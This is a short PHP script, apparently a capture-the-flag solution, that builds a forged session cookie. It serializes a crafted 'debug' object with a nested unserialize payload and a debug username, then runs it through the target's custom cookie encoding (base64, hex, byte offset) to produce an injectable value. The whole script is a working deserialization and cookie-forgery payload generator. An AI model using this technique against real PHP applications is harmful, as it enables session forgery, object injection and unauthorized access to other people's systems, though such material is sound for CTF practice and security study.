<?php

function cookie_encode($str) {
    $key = base64_encode($str);
    $key = bin2hex($key);
    $arr = str_split($key, 2);
    $cipher = '';
    foreach($arr as $value) {
        $num = hexdec($value);
        $num = $num + 240;
        $cipher = $cipher.'&'.dechex($num);
    }
    return $cipher;
}

class session{
    public $choose = 1;
    public $id = 0;
    public $username = "";
}

class debug
{
    public $choose = "2";
    public $forbidden = "";
    public $access_token = "";
    public $ob = NULL;
    public $id = 2;
    public $username = "debuger";

    public function __construct()
    {
        $this->forbidden = unserialize('O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;}');
    }
}

$d = new debug();
//echo serialize($d);
echo cookie_encode(serialize($d));

?>
